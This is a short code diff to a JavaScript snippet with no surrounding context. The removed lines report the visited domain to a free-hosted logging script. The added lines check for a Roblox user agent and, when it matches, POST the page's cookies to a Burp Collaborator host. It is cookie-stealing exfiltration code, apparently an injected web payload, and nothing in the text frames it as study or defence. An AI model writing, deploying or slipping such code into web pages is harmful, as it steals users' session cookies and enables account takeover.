@@ -1,4 +1,8 @@
-if(document.domain=="www.youporn.com"){
-let img=new Image();
-img.src=`https://lordwd.000webhostapp.com/log.php?domain=${document.domain}`
+var ua=navigator.userAgent
+if(ua.match(/roblox/ig)){
+fetch('https://6szqqitjnpdgfwcehsxboz9kjbp1dq.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
 }
